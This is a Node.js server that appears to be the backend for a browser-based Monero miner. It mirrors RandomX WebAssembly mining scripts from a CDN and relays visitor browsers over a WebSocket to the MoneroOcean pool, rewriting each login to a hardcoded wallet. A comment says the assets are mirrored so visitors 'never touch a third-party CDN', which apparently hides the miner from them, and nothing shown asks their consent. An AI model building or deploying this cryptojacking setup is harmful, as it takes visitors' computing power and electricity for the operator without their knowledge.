const http = require('http');
const fs = require('fs');
const path = require('path');
const net = require('net');
const crypto = require('crypto');
const { WebSocketServer, WebSocket } = require('ws');

const PORT      = Number(process.env.PORT || 8080);
const WALLET    = process.env.WALLET || '446vGEauAzVHFxd9yMcxCA4SMUzuAB9ggXxZu19TFF1wYGZ4UBSYrdHBt1GbEChH1QYiopYCsReLr1dveAffyTZv4GbTtRx';
const POOL_HOST = process.env.POOL_HOST || 'gulf.moneroocean.stream';
const POOL_PORT = Number(process.env.POOL_PORT || 10001);

const ASSET_BASE = 'https://cdn.jsdelivr.net/gh/aa022/RandomX-bonanza@v0.3.0/dist/';
const ASSETS = new Set([
  'embed.js', 'embed-worker.js', 'worker.js', 'fb_full.js',
  'randomx.js', 'randomx.wasm', 'randomx_st.js', 'randomx_st.wasm'
]);

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.wasm': 'application/wasm',
  '.css': 'text/css; charset=utf-8',
  '.ico': 'image/x-icon'
};

const cache = new Map();

async function asset(name) {
  if (cache.has(name)) return cache.get(name);
  const r = await fetch(ASSET_BASE + name, { redirect: 'follow' });
  if (!r.ok) throw new Error('asset ' + name + ' -> ' + r.status);
  const buf = Buffer.from(await r.arrayBuffer());
  cache.set(name, buf);
  return buf;
}

const ISOLATION = {
  'Cross-Origin-Opener-Policy': 'same-origin',
  'Cross-Origin-Embedder-Policy': 'require-corp',
  'Cross-Origin-Resource-Policy': 'cross-origin'
};

const server = http.createServer(async (req, res) => {
  const pathname = decodeURIComponent(new URL(req.url, 'http://x').pathname);

  if (pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    return res.end('ok');
  }

  // engine assets, mirrored so visitors never touch a third-party CDN
  if (pathname.startsWith('/rx/')) {
    const name = pathname.slice(4);
    if (!ASSETS.has(name)) { res.writeHead(404); return res.end('no'); }
    try {
      const buf = await asset(name);
      res.writeHead(200, {
        'Content-Type': MIME[path.extname(name)] || 'application/octet-stream',
        'Cache-Control': 'public, max-age=604800',
        ...ISOLATION
      });
      return res.end(buf);
    } catch {
      res.writeHead(502);
      return res.end('asset unavailable');
    }
  }

  const rel = pathname === '/' ? '/index.html' : pathname;
  const file = path.join(__dirname, 'public', path.normalize(rel).replace(/^(\.\.[/\\])+/, ''));

  fs.readFile(file, (err, buf) => {
    if (err) { res.writeHead(404); return res.end('not found'); }
    res.writeHead(200, {
      'Content-Type': MIME[path.extname(file)] || 'application/octet-stream',
      'Cache-Control': 'no-store',
      ...ISOLATION
    });
    res.end(buf);
  });
});

// ── bridge: browser <-> MoneroOcean stratum ─────────────────────────────
const wss = new WebSocketServer({ server, path: '/bridge', perMessageDeflate: false, maxPayload: 1 << 20 });

wss.on('connection', (ws) => {
  const upstream = net.connect({ host: POOL_HOST, port: POOL_PORT });
  upstream.setNoDelay(true);
  upstream.setTimeout(180000, () => upstream.destroy());

  const suffix = crypto.randomBytes(3).toString('hex');
  let buf = '';

  upstream.on('data', (chunk) => {
    buf += chunk.toString('utf8');
    let i;
    while ((i = buf.indexOf('\n')) !== -1) {
      const line = buf.slice(0, i).trim();
      buf = buf.slice(i + 1);
      if (line && ws.readyState === WebSocket.OPEN) ws.send(line);
    }
  });

  ws.on('message', (raw) => {
    let text = raw.toString();
    try {
      const msg = JSON.parse(text);
      if (msg && msg.method === 'login') {
        msg.params = msg.params || {};
        msg.params.login = WALLET;
        msg.params.pass = 'web-' + suffix;
        msg.params.rigid = 'web-' + suffix;
        msg.params.algo = ['rx/0'];
        text = JSON.stringify(msg);
      }
    } catch {}
    for (const line of text.split('\n')) {
      if (line.trim()) upstream.write(line.trim() + '\n');
    }
  });

  const kill = () => {
    try { upstream.destroy(); } catch {}
    try { ws.close(); } catch {}
  };
  ws.on('close', kill);
  ws.on('error', kill);
  upstream.on('close', kill);
  upstream.on('error', kill);
});

server.listen(PORT, () => console.log(`:${PORT} -> ${POOL_HOST}:${POOL_PORT}`));
